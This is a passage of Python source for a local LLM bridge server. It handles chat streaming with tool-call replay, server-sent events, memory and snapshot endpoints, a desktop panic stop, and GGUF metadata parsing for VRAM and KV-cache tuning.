            # llama-server keeps the model resident after startup, so "prewarm"
            # is just a 1-token ping that forces any lazy mmap to fault in.
            model = (body.get("model") or "local").strip() or "local"
            try:
                payload = {
                    "model": model,
                    "messages": [{"role": "user", "content": "ok"}],
                    "max_tokens": 1,
                    "stream": False,
                }
                llama_post("/v1/chat/completions", payload, timeout=120)
                # Also compile the tool-call grammar so the first tool-using turn
                # is clean (see _warmup_tool_grammar). Background; non-Gemma only.
                if not _is_gemma_model(get_settings().get("model") or model):
                    threading.Thread(target=_warmup_tool_grammar, daemon=True).start()
                return self._send_json(200, {"ok": True, "model": model})
            except Exception as e:
                return self._send_json(200, {"ok": False, "error": str(e)})
        if p == "/api/desktop/panic":
            _desktop_panic.set()
            # deny every pending approval so any in-flight action unblocks fast
            with _approvals_lock:
                pending = [a["id"] for a in _approvals.values() if a.get("status") == "pending"]
            for aid in pending:
                decide_approval(aid, "deny")
            broadcast_event({"type": "desktop:panic", "on": True})
            return self._send_json(200, {"ok": True, "panic": True})
        if p == "/api/desktop/resume":
            _desktop_panic.clear()
            broadcast_event({"type": "desktop:panic", "on": False})
            return self._send_json(200, {"ok": True, "panic": False})
        if p == "/api/memories/forget":
            mid = (body.get("id") or "").strip()
            if not mid:
                return self._send_json(400, {"error": "id required"})
            r = tool_forget({"id": mid})
            broadcast_event({"type": "memories:update"})
            return self._send_json(200, r)
        if p == "/api/memories/clear":
            try:
                _save_memories([])
                broadcast_event({"type": "memories:update"})
                return self._send_json(200, {"ok": True})
            except Exception as e:
                return self._send_json(500, {"error": str(e)})
        if p == "/api/memories":
            # manual add from the memories panel in Settings
            text = (body.get("text") or "").strip()
            tags = body.get("tags") or []
            if not text:
                return self._send_json(400, {"error": "text required"})
            r = tool_remember({"text": text, "tags": tags if isinstance(tags, list) else []})
            broadcast_event({"type": "memories:update"})
            return self._send_json(200, r)
        if p == "/api/snapshots":
            # save the currently-rendered preview html (or any html blob the
            # client wants to keep) to data/snapshots/ with a safe filename.
            raw_name = (body.get("name") or "snapshot").strip()
            html = body.get("html") or ""
            if not html:
                return self._send_json(400, {"error": "html required"})
            safe = re.sub(r"[^A-Za-z0-9._-]+", "-", raw_name)[:60] or "snapshot"
            if not safe.lower().endswith(".html"):
                safe = safe + ".html"
            ts = time.strftime("%Y%m%d-%H%M%S")
            final_name = f"{ts}-{safe}"
            out_path = SNAPSHOTS_DIR / final_name
            out_path.write_text(html, encoding="utf-8")
            return self._send_json(200, {
                "ok": True,
                "name": final_name,
                "path": str(out_path),
                "url": f"/api/snapshots/{final_name}",
            })
        if p == "/api/desktop/chat-toggle":
            cid = (body.get("chat_id") or "").strip()
            if not cid:
                return self._send_json(400, {"error": "chat_id required"})
            disabled = bool(body.get("disabled"))
            if disabled:
                _chat_desktop_disabled.add(cid)
            else:
                _chat_desktop_disabled.discard(cid)
            return self._send_json(200, {"chat_id": cid, "disabled": disabled})
        if p == "/api/system-context/refresh":
            try:
                md = rescan_system_context()
                broadcast_event({"type": "system-context:update"})
                return self._send_json(200, {"md": md, "path": str(SYSTEM_CONTEXT_FILE)})
            except Exception as e:
                return self._send_json(500, {"error": str(e)})
        if p == "/api/system-context":
            md = (body.get("md") or "").strip()
            if not md:
                return self._send_json(400, {"error": "md empty"})
            try:
                SYSTEM_CONTEXT_FILE.parent.mkdir(parents=True, exist_ok=True)
                SYSTEM_CONTEXT_FILE.write_text(md + "\n", encoding="utf-8")
                broadcast_event({"type": "system-context:update"})
                return self._send_json(200, {"md": md, "path": str(SYSTEM_CONTEXT_FILE)})
            except Exception as e:
                return self._send_json(500, {"error": str(e)})
        return self._send_json(404, {"error": "not found"})

    # ---- SSE

    def _serve_sse(self):
        # Reconnect support: browser EventSource auto-resends Last-Event-ID
        # after a network drop. We replay any events the client missed from
        # the in-memory ring buffer before resuming the live stream. The
        # subscribe() snapshot id is the cut-off — anything newer than it
        # arrives via the queue, anything older was either already seen or
        # has rolled off the buffer (we send a `lost` marker for that).
        last_id = 0
        raw = (self.headers.get("Last-Event-ID") or "").strip()
        if raw.isdigit():
            try:
                last_id = int(raw)
            except Exception:
                last_id = 0

        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache, no-transform")
        self.send_header("X-Accel-Buffering", "no")
        self.send_header("Connection", "keep-alive")
        self._set_cors()
        self.end_headers()
        q, snapshot_id = subscribe()
        try:
            # Hello includes the snapshot id so the client can detect a
            # bridge restart (snapshot_id reset to a small number).
            self._sse_send(
                {"type": "hello", "t": int(time.time()),
                 "snapshot_id": snapshot_id,
                 "replayed_from": last_id if last_id else None},
                evt_id=snapshot_id or None,
            )
            # Replay missed events.
            if last_id and last_id < snapshot_id:
                missed = replay_events_since(last_id, snapshot_id)
                if missed:
                    # If the gap exceeds the buffer, the oldest replayed id
                    # will be > last_id + 1 — flag the gap explicitly so
                    # the client can decide whether to reload the page.
                    oldest_replayed = missed[0][0]
                    if oldest_replayed > last_id + 1:
                        self._sse_send({
                            "type": "events:gap",
                            "lost_from": last_id + 1,
                            "lost_to": oldest_replayed - 1,
                            "note": "bridge buffer overflowed during disconnect; some events were lost",
                        })
                    for evt_id, evt in missed:
                        self._sse_send(evt, evt_id=evt_id)
            # Pending approvals are *state*, not history — always re-emit
            # so a fresh tab finds them even if the original event aged out.
            for a in list_approvals():
                self._sse_send({"type": "approval:new", "approval": a})
            last_ping = time.time()
            while True:
                try:
                    evt = q.get(timeout=15)
                    self._sse_send(evt, evt_id=evt.get("_id"))
                except Empty:
                    if time.time() - last_ping > 14:
                        try:
                            self.wfile.write(b": ping\n\n")
                            self.wfile.flush()
                            last_ping = time.time()
                        except Exception:
                            break
        except Exception:
            pass
        finally:
            unsubscribe(q)

    def _sse_send(self, obj: dict, evt_id: int = None):
        try:
            if evt_id is not None and evt_id > 0:
                self.wfile.write(f"id: {evt_id}\n".encode("utf-8"))
            self.wfile.write(b"data: ")
            self.wfile.write(json.dumps(obj, ensure_ascii=False).encode("utf-8"))
            self.wfile.write(b"\n\n")
            self.wfile.flush()
        except Exception:
            raise

    # ---- chat streaming endpoint

    def _handle_chat(self, body: dict):
        chat_id = body.get("chat_id") or uuid.uuid4().hex[:12]
        user_text = (body.get("message") or "").strip()
        mode = body.get("mode") or "auto"  # auto | ide | agent
        images = body.get("images") or []  # list of base64 data URLs
        regenerate = bool(body.get("regenerate"))
        if not user_text and not images and not regenerate:
            return self._send_json(400, {"error": "empty message"})

        # Two paths for incoming images:
        #   (a) The loaded model has its own vision tower (we booted with
        #       --mmproj). Pass the images straight through as image_url
        #       blocks so the model sees them natively. Persist the data URLs
        #       on the message dict for replay.
        #   (b) Text-only model + a SEPARATE vision server (VISION_LLAMA_HOST
        #       env var) is configured. Round-trip each image through that
        #       OCR/vision side-model and inline its description as text.
        # If neither path is available — text-only chat model AND no separate
        # vision server — fail the request up front instead of silently
        # inlining "[vision server failed: …]" into the prompt, which made
        # the chat model hallucinate excuses about a "broken llama-server."
        vision_native = bool(images) and _llama.is_vision_capable()
        ocr_available = (VISION_LLAMA and VISION_LLAMA != LLAMA)
        if images and not vision_native and not ocr_available:
            loaded = _llama.loaded_model() or "(none)"
            loaded_name = loaded.split("\\")[-1].split("/")[-1] if loaded != "(none)" else loaded
            return self._send_json(400, {"error":
                f"This model can't see images. The loaded model "
                f"'{loaded_name}' has no vision projector (mmproj), and no "
                f"separate vision server is configured.\n\n"
                f"Fix: load a vision-capable GGUF (one with a sibling "
                f"mmproj-*.gguf, e.g. Qwen2.5-VL, LLaVA, MiniCPM-V) and "
                f"point Settings → 'Vision projector (mmproj)' at the "
                f"projector file. Then relaunch the model from Settings."
            })
        if images and not vision_native:
            descriptions = []
            for i, img in enumerate(images):
                desc = describe_image(img, hint=user_text)
                descriptions.append(f"[image {i + 1} — transcribed by vision model]\n{desc}")
            vision_block = "\n\n".join(descriptions)
            user_text = (user_text + "\n\n" + vision_block).strip() if user_text else vision_block

        chats = get_chats()
        if chat_id not in chats["chats"]:
            chats["chats"][chat_id] = {
                "id": chat_id,
                "title": _title_from_prompt(user_text),
                "created": int(time.time()),
                "updated": int(time.time()),
                "messages": [],
            }
            chats["order"].insert(0, chat_id)
        chat = chats["chats"][chat_id]
        # remember the mode this chat was last used in so the client can
        # restore it on session switch
        chat["last_mode"] = mode
        # regenerate: drop the last assistant turn so we re-run on the same
        # prior user message.  only valid if the most recent message is
        # actually an assistant reply.
        if regenerate:
            # Pop the whole prior agentic tail — final assistant + every
            # intermediate assistant and tool message — back to the last user
            # turn. With server-side history, "regenerate" means re-run from
            # exactly that user message, so the loop's internal context resets.
            while chat["messages"] and chat["messages"][-1].get("role") in ("assistant", "tool"):
                chat["messages"].pop()
            if not chat["messages"] or chat["messages"][-1].get("role") != "user":
                save_json(CHATS_FILE, chats)
                return self._send_json(400, {"error": "nothing to regenerate"})
            user_text = chat["messages"][-1].get("content", "")
        else:
            # auto-name any chat still using the default placeholder when its first
            # user message comes in
            is_first_user_msg = not any(m.get("role") == "user" for m in chat.get("messages", []))
            if is_first_user_msg and chat.get("title", "").strip().lower() in ("", "new session", "new conversation"):
                chat["title"] = _title_from_prompt(user_text)
                broadcast_event({"type": "chat:rename", "chat_id": chat_id, "title": chat["title"]})
            user_msg: dict = {"role": "user", "content": user_text, "t": int(time.time())}
            if body.get("invisible"):
                user_msg["invisible"] = True
            if vision_native:
                # Stored as data URLs so replay on the next turn (or after a
                # reload) reattaches them. Frontend stripped non-image fields
                # already; we re-attach as user-attached metadata.
                user_msg["images"] = list(images)
            chat["messages"].append(user_msg)
        chat["updated"] = int(time.time())
        save_json(CHATS_FILE, chats)

        # IDE mode keeps tools available — the user often asks "save that" or
        # "read this file" mid-design session. The IDE prompt below is what
        # stops the model from WRAPPING every HTML response in write_file;
        # disabling tools entirely just causes existential-crisis spirals
        # ("can I use write_file? am I allowed to? what mode am I in?").
        use_tools = True
        # Gemma emits a python-shaped call (```tool_code``` + name(arg=value))
        # that llama.cpp's NATIVE tool parser can't decode — so we don't hand
        # llama-server the `tools` array (that path silently no-ops and the model
        # narrates fake success). Instead we run "text-tools" mode: tools are
        # described in the system prompt and we parse the tool_code shape out of
        # the reply ourselves (extract_tool_calls case 7b). We check EVERY model
        # id (settings name, configured path, loaded model) so a stale field
        # can't misroute. See in-app FAQ.
        native_tools = True
        tools_off_reason = ""
        _s = get_settings()
        _model_ids = (_s.get("model"), _s.get("model_path"), _llama.loaded_model())
        if use_tools and any(_is_gemma_model(m) for m in _model_ids):
            native_tools = False
        # Rolling summary: fold the oldest un-kept turns into a compact summary
        # instead of letting truncate_messages delete them outright. Keeps the
        # "we hit bug X, fixed it by Y" lessons alive so the model stops
        # repeating mistakes it already fixed on long tasks. Token-aware: one
        # extra (quick) model call fires only once the conversation actually
        # fills ~55% of the live context window, NOT on a fixed message count —
        # so short sessions keep full detail. Graceful: failure keeps the prior summary.
        if get_settings().get("summarize_history", True):
            try:
                _ctx_for_summary = _llama_props_ctx() or int(get_settings().get("num_ctx") or 32768)
                if _maybe_roll_summary(chat, _ctx_for_summary):
                    save_json(CHATS_FILE, chats)
            except Exception:
                traceback.print_exc()
        system_prompt = build_system_prompt(include_tools=use_tools, chat_mode=mode)
        # Pinned facts/fixes — verbatim, highest priority, never trimmed.
        _pins = chat.get("pins") or []
        if _pins:
            system_prompt += (
                "\n\n=== PINNED FOR THIS SESSION (established facts/fixes — do NOT undo or repeat) ===\n"
                + "\n".join(f"- {p}" for p in _pins)
            )
        _roll = chat.get("rolling_summary", "")
        if _roll:
            system_prompt += (
                "\n\n=== EARLIER IN THIS SESSION (older turns condensed to save context; "
                "treat these as established facts — do not redo work or re-ask) ===\n" + _roll
            )
        if use_tools:
            system_prompt += (
                "\n\nWhen you fix a bug, settle a design decision, or the user states a constraint, "
                "call pin_note to lock it in for this session so you never undo it or repeat the mistake."
            )
        # Text-tools mode (Gemma): llama-server won't emit structured tool_calls
        # for this model, so pin the exact shape we CAN parse. One call, python
        # form, inside a tool_code fence — and never claim a tool ran unless a
        # tool result actually came back.
        if not native_tools:
            system_prompt += (
                "\n\nTOOL CALLING — IMPORTANT for this model:\n"
                "to call a tool, output EXACTLY one python call inside a ```tool_code``` fence, then STOP:\n"
                "```tool_code\n"
                "read_file(path=\"C:/notes.txt\")\n"
                "```\n"
                "- one call per turn; use the tool names listed above; keyword args with real quotes.\n"
                "- do NOT wrap it in JSON, <tool_call> tags, or prose.\n"
                "- after you emit the fence, wait for the tool result — never write \"done\"/\"saved\" "
                "or narrate a result before the tool actually returns one.\n"
                "- when a tool result comes back and the task has more steps, IMMEDIATELY emit the "
                "next tool_code call. Do not stop to summarize, do not ask permission, do not say "
                "what you will do — do it. Only write prose once the ENTIRE task is finished."
            )
        msgs: list[dict] = [{"role": "system", "content": system_prompt}]
        # Replay the FULL stored history including intermediate-assistant
        # turns (with tool_calls) and tool-result messages from prior agentic
        # loops. This is the anti-amnesia change — the model picks up its
        # working memory from where the last turn left off, not from a sanitised
        # bubble-only transcript.
        # On the vision-native path, the live model can re-see images on every
        # replay. On the text-only path we already inlined descriptions into
        # the user_text at append time, so list content is never reconstructed.
        replay_vision = _llama.is_vision_capable()
        # Replay only turns NOT already folded into the rolling summary — this
        # is what actually saves the window (the summary stands in for them).
        _replay_from = int(chat.get("summary_through", 0) or 0)
        for m in chat["messages"][_replay_from:]:
            role = m.get("role")
            if role not in ("user", "assistant", "tool"):
                continue
            stored_images = m.get("images") if role == "user" else None
            if stored_images and replay_vision:
                # Rebuild OpenAI-style content array. Text first (the model
                # reads top-to-bottom), then each image as image_url.
                parts: list[dict] = []
                txt = m.get("content", "") or ""
                if txt:
                    parts.append({"type": "text", "text": txt})
                for img in stored_images:
                    if not isinstance(img, str) or not img:
                        continue
                    url = img if img.startswith("data:") else f"data:image/png;base64,{img}"
                    parts.append({"type": "image_url", "image_url": {"url": url}})
                # If we somehow ended up with no parts (shouldn't happen),
                # fall back to plain text so the message isn't empty.
                out: dict = {"role": role, "content": parts if parts else (txt or "")}
            else:
                out: dict = {"role": role, "content": m.get("content", "") or ""}
            if role == "assistant" and m.get("tool_calls"):
                out["tool_calls"] = m["tool_calls"]
            if role == "tool":
                if m.get("tool_call_id"):
                    out["tool_call_id"] = m["tool_call_id"]
                if m.get("name"):
                    out["name"] = m["name"]
            msgs.append(out)

        # set up SSE response — Connection: close so the browser reader resolves done
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache, no-transform")
        self.send_header("Connection", "close")
        self._set_cors()
        self.end_headers()

        def emit(evt: dict):
            evt = {**evt, "chat_id": chat_id}
            try:
                self.wfile.write(b"data: ")
                self.wfile.write(json.dumps(evt, ensure_ascii=False).encode("utf-8"))
                self.wfile.write(b"\n\n")
                self.wfile.flush()
            except Exception:
                raise
            broadcast_event(evt)

        emit({"type": "chat_start", "chat_id": chat_id})
        if tools_off_reason:
            emit({"type": "tools_unavailable", "message": tools_off_reason})
        tok = _current_chat_id.set(chat_id)
        try:
            final = run_chat_turn(chat_id, msgs, use_tools=use_tools, emit=emit,
                                  native_tools=native_tools)
        except Exception as e:
            traceback.print_exc()
            try:
                emit({"type": "error", "error": str(e)})
            except Exception:
                return
            final = None
        finally:
            _current_chat_id.reset(tok)

        if final:
            chats = get_chats()
            if chat_id in chats["chats"]:
                chat = chats["chats"][chat_id]
                # Persist the agentic loop's working memory (tool calls + tool
                # results + intermediate assistant messages) BEFORE the final
                # bubble. Marked _internal=true on assistants so the renderer
                # skips them — they stay in the JSON purely so the model can
                # replay them on the next user turn.
                appended = final.pop("_appended_intermediate", None) or []
                now_t = int(time.time())
                for im in appended:
                    role = im.get("role")
                    if role not in ("assistant", "tool"):
                        # the empty-retry "system" nudge isn't worth persisting
                        continue
                    persisted = {
                        "role": role,
                        "content": im.get("content", "") or "",
                        "t": now_t,
                    }
                    if role == "assistant":
                        persisted["_internal"] = True
                        if im.get("tool_calls"):
                            persisted["tool_calls"] = im["tool_calls"]
                    elif role == "tool":
                        if im.get("tool_call_id"):
                            persisted["tool_call_id"] = im["tool_call_id"]
                        if im.get("name"):
                            persisted["name"] = im["name"]
                    chat["messages"].append(persisted)

                msg = {
                    "role": "assistant",
                    "content": final.get("content", ""),
                    "t": now_t,
                }
                stats = final.get("_stats") or {}
                if stats.get("eval_count") is not None:
                    msg["tokens"] = stats["eval_count"]
                if stats.get("prompt_eval_count") is not None:
                    msg["prompt_tokens"] = stats["prompt_eval_count"]
                chat["messages"].append(msg)
                chat["updated"] = now_t
                # Retention cap: keep the chat under CHAT_HISTORY_MAX messages.
                # Anchors (system + first user) are always kept; oldest beyond
                # that get dropped. Trimmer at request time gives the model a
                # tight tail; this cap keeps the JSON file from ballooning.
                _enforce_chat_retention(chat)
                html = extract_html(final.get("content", ""))
                if html:
                    entry = save_version(chat_id, html, label=user_text[:80])
                    chat["last_version"] = entry["id"]
                    try:
                        emit({"type": "version_saved", "version": entry})
                    except Exception:
                        pass
                save_json(CHATS_FILE, chats)

        try:
            emit({"type": "chat_end"})
        except Exception:
            pass


# ---- llama-server management -----------------------------------------------
# Bridge owns the llama-server subprocess so the user can swap models from the
# UI without restarting anything. Set settings.model_path to the .gguf and we
# (re)spawn llama-server with the unsloth-tuned flag set.


# ---- VRAM detection + auto-tune --------------------------------------------
# The goal is "no friction": user picks (or we detect) their VRAM tier and we
# fill in sensible llama-server flags. Power users can still override every
# field. Heuristics here are deliberately conservative — leaving 10-15% VRAM
# headroom beats hitting an OOM mid-generation.

def detect_vram_gb() -> dict:
    """Best-effort GPU VRAM probe. Returns {gb, name, source} or
    {gb: 0, name: "", source: "none"} on failure. Tries nvidia-smi first
    (most common), then falls back to silence. Never raises."""
    out = {"gb": 0, "name": "", "source": "none"}
    # nvidia-smi --query-gpu=memory.total,name --format=csv,noheader,nounits
    smi = shutil.which("nvidia-smi")
    if smi:
        try:
            r = subprocess.run(
                [smi, "--query-gpu=memory.total,name", "--format=csv,noheader,nounits"],
                capture_output=True, text=True, timeout=3,
                creationflags=(subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0),
            )
            if r.returncode == 0 and r.stdout.strip():
                # First line = primary GPU. "12282, NVIDIA GeForce RTX 4070"
                first = r.stdout.strip().splitlines()[0]
                parts = [p.strip() for p in first.split(",", 1)]
                if parts and parts[0].isdigit():
                    mb = int(parts[0])
                    out["gb"] = round(mb / 1024, 1)
                    out["name"] = parts[1] if len(parts) > 1 else "NVIDIA GPU"
                    out["source"] = "nvidia-smi"
                    return out
        except Exception:
            pass
    return out


# Filename patterns that indicate a Mixture-of-Experts model. Used as a fallback
# when GGUF header parsing fails or the model file is unreachable.
_MOE_FILENAME_HINTS = (
    "moe", "mixtral", "deepseek-v2", "deepseek-v3", "deepseek-coder-v2",
    "qwen3.5-moe", "qwen3-moe", "qwen3.6", "glm-4.7", "glm-4.6", "glm-4.5",
    "phi-3.5-moe", "grok", "dbrx", "jamba", "arctic",
)
# A3B / A13B style suffix: "active 3B" or "active 13B" — also MoE.
_ACTIVE_RE = re.compile(r"-a(\d+)b", re.IGNORECASE)
# Total params: "35B", "47B", "8x7B" (treat as ~47B), etc.
_TOTAL_RE = re.compile(r"\b(\d+(?:\.\d+)?)x(\d+(?:\.\d+)?)b\b|\b(\d+(?:\.\d+)?)b\b", re.IGNORECASE)

# Quant suffix in filename, e.g. "Q4_K_M", "Q3_K_S", "IQ4_XS", "F16".
_QUANT_RE = re.compile(r"\b(IQ\d_[A-Z]{1,3}|Q\d_[KS01]?_?[MS]?|Q\d_K|F16|BF16|F32)\b", re.IGNORECASE)


def read_gguf_metadata(path: str, max_bytes: int = 4 * 1024 * 1024) -> dict:
    """Parse the GGUF v2/v3 header and return architecture-level metadata.
    Reads at most a few MB from the file's start — the metadata block lives
    right after the magic. Never raises; returns {ok: False} on any parse
    failure so callers can fall back to filename heuristics.

    GGUF spec reference: https://github.com/ggerganov/ggml/blob/master/docs/gguf.md
    Layout: "GGUF" magic, uint32 version, uint64 tensor_count, uint64 kv_count,
    then kv_count entries of (str key, uint32 value_type, value).
    """
    out = {
        "ok": False,
        "architecture": "",
        "size_label": "",
        "block_count": 0,             # n_layer
        "expert_count": 0,            # 0 for dense, > 0 for MoE
        "expert_used_count": 0,       # active experts per token
        "head_count": 0,              # query heads
        "head_count_kv": 0,           # KV heads (smaller for GQA)
        "key_length": 0,              # per-head key dim
        "value_length": 0,            # per-head value dim
        "embedding_length": 0,
        "feed_forward_length": 0,
        "expert_feed_forward_length": 0,  # MoE: per-expert FFN width
        "context_length": 0,              # the model's trained max context
        "nextn_predict_layers": 0,        # >0 means the GGUF carries MTP heads
                                          # (key: "<arch>.nextn_predict_layers"). This is the same
                                          # signal llama.cpp itself uses to enable --spec-type draft-mtp.
        "has_mtp": False,                 # convenience flag: nextn_predict_layers > 0
    }
    if not path:
        return out
    try:
        import struct
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        if len(data) < 24 or data[:4] != b"GGUF":
            return out
        pos = 4
        version = struct.unpack_from("<I", data, pos)[0]; pos += 4
        if version < 2:
            return out  # v1 had a different layout
        # tensor_count, kv_count
        struct.unpack_from("<Q", data, pos)[0]; pos += 8  # tensor_count, unused
        kv_count = struct.unpack_from("<Q", data, pos)[0]; pos += 8

        # GGUF value type enum
        T_UINT8, T_INT8 = 0, 1
        T_UINT16, T_INT16 = 2, 3
        T_UINT32, T_INT32 = 4, 5
        T_FLOAT32, T_BOOL, T_STRING, T_ARRAY = 6, 7, 8, 9
        T_UINT64, T_INT64, T_FLOAT64 = 10, 11, 12
        scalar_fmt = {
            T_UINT8: ("<B", 1), T_INT8: ("<b", 1),
            T_UINT16: ("<H", 2), T_INT16: ("<h", 2),
            T_UINT32: ("<I", 4), T_INT32: ("<i", 4),
            T_FLOAT32: ("<f", 4), T_BOOL: ("<?", 1),
            T_UINT64: ("<Q", 8), T_INT64: ("<q", 8),
            T_FLOAT64: ("<d", 8),
        }

        def read_str(p):
            n = struct.unpack_from("<Q", data, p)[0]
            p += 8
            s = data[p:p + n].decode("utf-8", errors="replace")
            return s, p + n

        def read_value(p, vtype):
            if vtype in scalar_fmt:
                fmt, sz = scalar_fmt[vtype]
                return struct.unpack_from(fmt, data, p)[0], p + sz
            if vtype == T_STRING:
                return read_str(p)
            if vtype == T_ARRAY:
                etype = struct.unpack_from("<I", data, p)[0]; p += 4
                ecount = struct.unpack_from("<Q", data, p)[0]; p += 8
                # We never need array contents for tuning; just skip past them.
                if etype in scalar_fmt:
                    _, sz = scalar_fmt[etype]
                    return None, p + sz * ecount
                if etype == T_STRING:
                    for _ in range(ecount):
                        n = struct.unpack_from("<Q", data, p)[0]
                        p += 8 + n
                    return None, p
                # Nested arrays / unknown — bail safely
                return None, p
            return None, p  # unknown scalar type, give up gracefully

        meta: dict = {}
        for _ in range(kv_count):
            try:
                key, pos = read_str(pos)
                vtype = struct.unpack_from("<I", data, pos)[0]; pos += 4
                val, pos = read_value(pos, vtype)
                if val is not None:
                    meta[key] = val
            except (struct.error, IndexError):
                # Ran past the buffered window — stop gracefully, keep what we got.
                break

        arch = str(meta.get("general.architecture", "")).strip()
        if not arch:
            return out
        out["architecture"] = arch
        out["size_label"] = str(meta.get("general.size_label", "")).strip()

        def num(*keys):
            for k in keys:
                v = meta.get(k)
                if isinstance(v, (int, float)) and v:
                    return int(v)
            return 0

        out["block_count"] = num(f"{arch}.block_count")
        out["expert_count"] = num(f"{arch}.expert_count")
        out["expert_used_count"] = num(f"{arch}.expert_used_count")
        out["head_count"] = num(f"{arch}.attention.head_count")
        out["head_count_kv"] = num(
            f"{arch}.attention.head_count_kv",
            f"{arch}.attention.head_count",  # MHA: kv = q
        )
        out["key_length"] = num(f"{arch}.attention.key_length")
        out["value_length"] = num(f"{arch}.attention.value_length")
        out["embedding_length"] = num(f"{arch}.embedding_length")
        out["feed_forward_length"] = num(f"{arch}.feed_forward_length")
        out["expert_feed_forward_length"] = num(f"{arch}.expert_feed_forward_length")
        out["context_length"] = num(f"{arch}.context_length")

        # Derive missing dims when possible
        if not out["key_length"] and out["embedding_length"] and out["head_count"]:
            out["key_length"] = out["embedding_length"] // out["head_count"]
        if not out["value_length"]:
            out["value_length"] = out["key_length"]

        # MTP detection. llama.cpp tags MTP-capable architectures (Qwen 3.5/3.6,
        # DeepSeek V3/R1, ...) with "<arch>.nextn_predict_layers" in the GGUF
        # metadata KV. Reading the value here means we never have to guess from
        # filenames — works even if the file is renamed or repacked. Falls
        # cleanly to has_mtp=False on older GGUFs that lack the key.
        nextn = num(f"{arch}.nextn_predict_layers")
        if not nextn:
            # Some converters drop the arch prefix on this key. Catch the unprefixed
            # variant as a backup before giving up.
            for k, v in meta.items():
                if k.endswith(".nextn_predict_layers") or k == "nextn_predict_layers":
                    if isinstance(v, (int, float)) and v > 0:
                        nextn = int(v)
                        break
        out["nextn_predict_layers"] = int(nextn or 0)
        out["has_mtp"] = out["nextn_predict_layers"] > 0

        out["ok"] = bool(out["architecture"] and out["block_count"])
        return out
    except Exception:
        return out


def inspect_model(model_path: str) -> dict:
    """Return a profile of a GGUF model. Reads the GGUF header for accurate
    architecture data (layer count, MoE expert count, GQA config). Falls back
    to filename heuristics when the header is unavailable.
    Never raises — returns sensible defaults if anything fails.
    """
    out = {
        "path": model_path or "",
        "name": "",
        "size_gb": 0.0,
        "is_moe": False,
        "active_params_b": 0,
        "total_params_b": 0,
        "quant": "",
        # GGUF-derived (zero when header unreadable)
        "architecture": "",
        "block_count": 0,
        "expert_count": 0,
        "expert_used_count": 0,
        "head_count_kv": 0,
        "key_length": 0,
        "value_length": 0,
        "embedding_length": 0,
        "feed_forward_length": 0,
        "expert_feed_forward_length": 0,
        "context_length": 0,
        "metadata_source": "filename",  # or "gguf"
        "has_mtp": False,                 # GGUF carries built-in MTP heads (nextn_predict_layers > 0)
        "nextn_predict_layers": 0,
    }
    if not model_path:
        return out
    try:
        p = Path(model_path)
        out["name"] = p.name
        out["size_gb"] = round(p.stat().st_size / (1024 ** 3), 2)
    except Exception:
        return out
    name_lc = out["name"].lower()
    qm = _QUANT_RE.search(out["name"])
    if qm:
        out["quant"] = qm.group(1).upper()

    # Try GGUF header first — authoritative when present.
    gg = read_gguf_metadata(model_path)
    if gg.get("ok"):
        out["metadata_source"] = "gguf"
        out["architecture"] = gg["architecture"]
        out["block_count"] = gg["block_count"]
        out["expert_count"] = gg["expert_count"]
        out["expert_used_count"] = gg["expert_used_count"]
        out["head_count_kv"] = gg["head_count_kv"]
        out["key_length"] = gg["key_length"]
        out["value_length"] = gg["value_length"]
        out["embedding_length"] = gg["embedding_length"]
        out["feed_forward_length"] = gg["feed_forward_length"]
        out["expert_feed_forward_length"] = gg["expert_feed_forward_length"]
        out["context_length"] = gg["context_length"]
        out["is_moe"] = gg["expert_count"] > 1
        out["has_mtp"] = bool(gg.get("has_mtp", False))
        out["nextn_predict_layers"] = int(gg.get("nextn_predict_layers", 0) or 0)
        # total/active param counts: prefer the size_label like "30B-A3B"
        sl = (gg.get("size_label") or "").lower()
        am = _ACTIVE_RE.search(sl) or _ACTIVE_RE.search(name_lc)
        if am:
            try:
                out["active_params_b"] = int(am.group(1))
            except Exception:
                pass
        for tm in _TOTAL_RE.finditer(sl + " " + name_lc):
            try:
                if tm.group(1) and tm.group(2):
                    v = float(tm.group(1)) * float(tm.group(2))
                elif tm.group(3):
                    v = float(tm.group(3))
                else:
                    continue
            except Exception:
                continue
            if v > out["total_params_b"]:
                out["total_params_b"] = int(round(v))
        return out

    # Filename-only fallback (header parse failed)
    out["is_moe"] = any(h in name_lc for h in _MOE_FILENAME_HINTS) or bool(_ACTIVE_RE.search(name_lc))
    m = _ACTIVE_RE.search(name_lc)
    if m:
        try:
            out["active_params_b"] = int(m.group(1))
        except Exception:
            pass
    largest = 0.0
    for tm in _TOTAL_RE.finditer(name_lc):
        try:
            if tm.group(1) and tm.group(2):
                v = float(tm.group(1)) * float(tm.group(2))
            elif tm.group(3):
                v = float(tm.group(3))
            else:
                continue
        except Exception:
            continue
        if v > largest:
            largest = v
    out["total_params_b"] = int(round(largest)) if largest else 0
    return out


# KV cache dtype byte costs per element (post block-quant overhead).
# q4_0/q8_0 numbers are real: 0.5 + 1/32 (delta) = ~0.5625; 1 + 1/32 = ~1.0625.
_KV_DTYPE_BYTES = {"f16": 2.0, "q8_0": 1.0625, "q4_0": 0.5625}


def _kv_bytes_per_token(profile: dict, kv_dtype: str) -> int:
    """Exact KV cache cost per token using GGUF-derived attention config.
    Formula: 2 (K + V) * n_layer * head_count_kv * key_length * dtype_bytes.
    Returns 0 when GGUF metadata wasn't readable (caller falls back to bucket).
    """
    n_layer = profile.get("block_count", 0) or 0
    n_kv = profile.get("head_count_kv", 0) or 0
    head_dim = profile.get("key_length", 0) or 0
    if not (n_layer and n_kv and head_dim):
        return 0
    db = _KV_DTYPE_BYTES.get(kv_dtype, 1.0625)
    # K and V can have different dims (rare); use the larger to stay safe.
    v_dim = max(profile.get("value_length", 0) or head_dim, head_dim)
    return int(n_layer * n_kv * (head_dim + v_dim) * db)


def _kv_per_1k_mb(profile: dict, kv_dtype: str, file_size_gb: float) -> float:
    """Either GGUF-exact or size-bucket fallback. Returned in MB per 1k tokens."""
    bpt = _kv_bytes_per_token(profile, kv_dtype)
    if bpt > 0:
        return (bpt * 1000) / (1024 * 1024)
    # Fallback: rough bucketed estimate when GGUF header was unreadable.
    if file_size_gb < 8:
        base = 30.0
    elif file_size_gb < 20:
        base = 60.0
    elif file_size_gb < 40:
        base = 100.0
    else:
        base = 180.0
    if kv_dtype == "q4_0":
        base *= 0.55
    elif kv_dtype == "f16":
        base *= 1.9
    return base


def auto_tune(model_path: str, vram_gb: float) -> dict:
